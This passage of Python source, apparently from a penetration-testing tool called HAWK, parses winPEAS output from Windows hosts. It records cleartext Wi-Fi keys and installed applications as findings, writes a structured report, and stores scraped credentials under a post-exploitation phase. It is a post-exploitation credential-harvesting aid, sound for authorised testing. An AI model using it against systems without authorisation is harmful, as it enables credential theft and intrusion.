        "description": (
            f"Cleartext Wi-Fi PSKs found on {target}.\n\n"
            + "\n".join(lines)),
        "severity":    "high",
        "source":      "winpeas parser",
    })
    return {"name": "Wi-Fi Profiles", "body": body}


def _parse_installed_apps(sections, target, findings):
    """Installed applications — single info-finding with the whole
    list.  No CVE auto-correlation (noisy, fragile).  User eyeballs
    the list and runs the HAWK CVE search if curious."""
    body = (_find_section(sections, "applications", "information")
            or _find_section(sections, "installed", "applications")
            or _find_section(sections, "installed", "programs"))
    if not body:
        return None

    # Grab lines that look like app entries.  winPEAS sometimes does a
    # table (name / version / publisher) and sometimes a plain list.
    # We just keep lines with at least one letter + one digit (versions).
    apps = []
    for line in body.splitlines():
        line = line.strip()
        if (len(line) > 5 and len(line) < 200
                and re.search(r"[A-Za-z]", line)
                and re.search(r"\d", line)
                and not line.startswith("╔")
                and not line.startswith("[")):
            apps.append(line)

    # Dedup preserving order + cap — some winPEAS runs repeat entries.
    seen = set()
    unique = []
    for a in apps:
        if a not in seen:
            seen.add(a)
            unique.append(a)
    if len(unique) < 3:   # probably a false match, not a real list
        return None

    desc = (
        f"winPEAS enumerated {len(unique)} installed application "
        f"entries on {target}.\n"
        f"No CVE auto-correlation performed (use HAWK → Target Intel "
        f"→ SEARCH CVEs for entries of interest).\n\n"
        + "\n".join(f"  • {a}" for a in unique[:120]))
    if len(unique) > 120:
        desc += f"\n  ... and {len(unique) - 120} more (see .txt)"

    findings.append({
        "title":       f"Installed applications ({len(unique)})",
        "description": desc,
        "severity":    "info",
        "source":      "winpeas parser",
    })
    return {"name": "Installed Applications", "body": body}


# ═════════════════════════════════════════════════════════════════════
#  Structured .txt writer
# ═════════════════════════════════════════════════════════════════════

def _write_structured_txt(source_file: str,
                           clean_text: str,
                           section_reports: list,
                           findings: list,
                           creds: list,
                           sev_counts: dict,
                           target: str) -> None:
    """Overwrite the sibling .txt with a structured, navigable version
    of the winPEAS output.

    Layout:
      1. Header (target, timestamp, source file)
      2. Severity tally
      3. Table of contents (section name → line number)
      4. Per-section body, prefixed with a ruler line
      5. Raw (ANSI-stripped) dump at the very end for completeness

    The TOC line numbers are computed by walking the assembled body
    once we know its final layout, so they actually work when the
    user opens the file in vim / less and jumps to a line."""
    txt_path = contained_sibling(source_file, ".txt")

    rule = "═" * 67
    dash = "─" * 67

    # Build body piece-by-piece so we can record line offsets.
    buffer_lines: list[str] = []

    def _emit(s: str = ""):
        buffer_lines.append(s)

    _emit(rule)
    _emit(f"  HAWK — winPEAS parsed output  —  {target}")
    _emit(f"  Parsed: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    _emit(f"  Source: {os.path.basename(source_file)}")
    _emit(rule)
    _emit("")
    _emit("  SEVERITY TALLY")
    _emit(dash)
    _emit(f"    CRITICAL : {sev_counts['critical']}")
    _emit(f"    HIGH     : {sev_counts['high']}")
    _emit(f"    MEDIUM   : {sev_counts['medium']}")
    _emit(f"    LOW      : {sev_counts['low']}")
    _emit(f"    INFO     : {sev_counts['info']}")
    _emit(f"    creds    : {len(creds)}")
    _emit("")

    # Placeholder for TOC — we'll patch the line numbers in after we
    # know where each section starts.
    toc_line_start = len(buffer_lines)
    _emit("  TABLE OF CONTENTS")
    _emit(dash)
    toc_entries_start = len(buffer_lines)
    for i, s in enumerate(section_reports, 1):
        _emit(f"    [{i:>2}] {s['name']:<40} line   ???")
    _emit("")

    # Findings preview block.
    _emit("  FINDINGS (summary — full details in Target Intel tab)")
    _emit(dash)
    if findings:
        for f in findings:
            _emit(f"    [{f['severity'].upper():<8}] {f['title']}")
    else:
        _emit("    (no findings)")
    _emit("")

    # Credentials preview block.
    _emit("  CREDENTIALS EXTRACTED (full details in Credential Store)")
    _emit(dash)
    if creds:
        for c in creds:
            pw_preview = c.get("password", "") or "(no pass)"
            if len(pw_preview) > 24:
                pw_preview = pw_preview[:20] + "…"
            _emit(f"    • {c.get('username', '?'):<24} : "
                  f"{pw_preview}  ({c.get('notes', '')})")
    else:
        _emit("    (no credentials)")
    _emit("")
    _emit(rule)
    _emit("")

    # Each parsed section.
    section_line_offsets = []
    for i, s in enumerate(section_reports, 1):
        section_line_offsets.append(len(buffer_lines) + 1)  # 1-indexed
        _emit(f"[{i}] {s['name'].upper()}")
        _emit(dash)
        _emit(s["body"].rstrip())
        _emit("")
        _emit("")

    # Raw dump at the end.
    raw_start = len(buffer_lines) + 1
    _emit(rule)
    _emit("  RAW (ANSI-stripped) OUTPUT")
    _emit(rule)
    _emit(clean_text)

    # Patch TOC line numbers now that we know them.
    for i, offset in enumerate(section_line_offsets):
        line_no = offset
        idx = toc_entries_start + i
        section = section_reports[i]
        buffer_lines[idx] = (
            f"    [{i + 1:>2}] {section['name']:<40} "
            f"line {line_no:>5}")

    with open(txt_path, "w", encoding="utf-8") as fh:
        fh.write("\n".join(buffer_lines))


# ═════════════════════════════════════════════════════════════════════
#  Small helpers
# ═════════════════════════════════════════════════════════════════════

def _new_run_id() -> str:
    """Generate a linked-run id identical in shape to the ones used by
    the tool runners (see target_intel_widget._run_id_new)."""
    return f"winpeas-{uuid.uuid4().hex[:10]}"


def _scrape(text: str, pattern: str, flags: int = re.I) -> str:
    """Return the first capture group from `pattern` or empty string."""
    m = re.search(pattern, text, flags)
    return m.group(1).strip() if m else ""


def _push_finding(app, f: dict, run_id: str):
    try:
        app.target_intel.add_auto_finding(
            title=f["title"],
            description=f["description"],
            severity=f["severity"],
            source=f.get("source", "winpeas parser"),
            linked_run_id=run_id)
    except Exception:
        pass


def _push_credential(app, c: dict, run_id: str):
    try:
        from utils.session import Credential
        cred = Credential(
            username=c.get("username", ""),
            password=c.get("password", ""),
            host=c.get("host", ""),
            services=c.get("services", []) or [],
            cred_type=c.get("cred_type", "cleartext"),
            notes=c.get("notes", ""),
            source_phase="post_exploit",
            linked_run_id=run_id,
            # Scraped out of files/registry on the host: a candidate
            # secret, not a login winpeas performed.
            verified=False)
        app.cred_store.add_credential(cred)
    except Exception:
        pass


def _term_warn(app, msg: str):
    try:
        app.terminal.write(msg, "warn")
    except Exception:
        pass
